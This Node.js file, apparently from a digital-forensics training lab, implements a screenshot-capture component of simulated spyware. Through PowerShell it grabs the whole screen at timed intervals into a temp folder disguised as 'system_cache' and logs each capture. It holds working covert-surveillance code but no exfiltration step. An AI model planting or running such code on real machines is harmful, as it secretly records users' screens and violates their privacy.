// victim-repo/scripts/surveillance/screenshot.js
// DFIR Eğitim Sürümü – PowerShell ile gerçek ekran görüntüsü alır (VM'de test edin).

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

class Screenshot {
    constructor() {
        this.isRunning = false;
        this.screenshotDir = path.join(os.tmpdir(), 'system_cache');
        this.captured = [];
        this.total = 0;
        this.interval = null;
        this.logFile = path.join(this.screenshotDir, 'capture_log.txt');
        console.log('[!] Screenshot capture başlatılıyor – DFIR EĞİTİM SÜRÜMÜ');
        console.log('[!] Klasör:', this.screenshotDir);
    }

    initialize() {
        if (!fs.existsSync(this.screenshotDir)) {
            fs.mkdirSync(this.screenshotDir, { recursive: true });
        }
    }

    start(intervalMs = 30000) {
        if (this.isRunning) return;
        this.isRunning = true;
        this.total = 0;
        this.captured = [];
        this.initialize();

        const header = `
========================================
SCREENSHOT CAPTURE BAŞLATILDI
Tarih: ${new Date().toISOString()}
Interval: ${intervalMs/1000} sn
========================================
`;
        fs.writeFileSync(this.logFile, header);
        console.log('[+] Screenshot capture başlatıldı');

        this.capture(); // hemen bir tane al
        this.interval = setInterval(() => {
            if (this.isRunning) this.capture();
        }, intervalMs);
    }

    capture() {
        try {
            const ts = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `screenshot_${ts}_${this.total+1}.png`;
            const filepath = path.join(this.screenshotDir, filename);

            // PowerShell ile ekran görüntüsü al
            const psScript = `
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
$bitmap.Save('${filepath.replace(/\\/g, '\\\\')}')
$bitmap.Dispose()
$graphics.Dispose()
`;
            execSync(`powershell -Command "${psScript}"`, { timeout: 10000 });

            if (fs.existsSync(filepath) && fs.statSync(filepath).size > 0) {
                this.total++;
                this.captured.push({ path: filepath, ts, size: fs.statSync(filepath).size });
                const logEntry = `[${new Date().toISOString()}] CAPTURE #${this.total}: ${filename} (${fs.statSync(filepath).size} bytes)\n`;
                fs.appendFileSync(this.logFile, logEntry);
                console.log(`[+] Screenshot alındı #${this.total}: ${filename}`);
            } else {
                console.log('[!] Screenshot alınamadı, simüle ediliyor...');
                this.simulateScreenshot();
            }
        } catch (error) {
            console.error('[!] Screenshot hatası:', error.message);
            this.simulateScreenshot();
        }
    }

    simulateScreenshot() {
        const ts = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `screenshot_${ts}_${this.total+1}.png`;
        const filepath = path.join(this.screenshotDir, filename);
        // 1x1 px sahte PNG
        const fakePNG = Buffer.from([
            0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,
            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x08,0x06,0x00,0x00,0x00,0x1F,0x15,0xC4,
            0x89,0x00,0x00,0x00,0x0A,0x49,0x44,0x41,0x54,0x78,0x9C,0x63,0x00,0x01,0x00,0x00,
            0x05,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
            0x49,0x45,0x4E,0x44,0xAE,0x42,0x60,0x82
        ]);
        fs.writeFileSync(filepath, fakePNG);
        this.total++;
        this.captured.push({ path: filepath, ts, size: fakePNG.length, simulated: true });
        const logEntry = `[${new Date().toISOString()}] SIMULATED #${this.total}: ${filename} (${fakePNG.length} bytes)\n`;
        fs.appendFileSync(this.logFile, logEntry);
        console.log(`[!] Simüle screenshot #${this.total}`);
    }

    stop() {
        if (!this.isRunning) return;
        this.isRunning = false;
        if (this.interval) clearInterval(this.interval);
        const footer = `
========================================
SCREENSHOT CAPTURE DURDURULDU
Toplam capture: ${this.total}
Toplam boyut: ${this.captured.reduce((s,i) => s + i.size, 0) / 1024} KB
========================================
`;
        fs.appendFileSync(this.logFile, footer);
        console.log('[+] Screenshot capture durduruldu');
    }

    getStats() {
        return { isRunning: this.isRunning, totalCaptures: this.total, directory: this.screenshotDir, logFile: this.logFile };
    }
}

module.exports = Screenshot;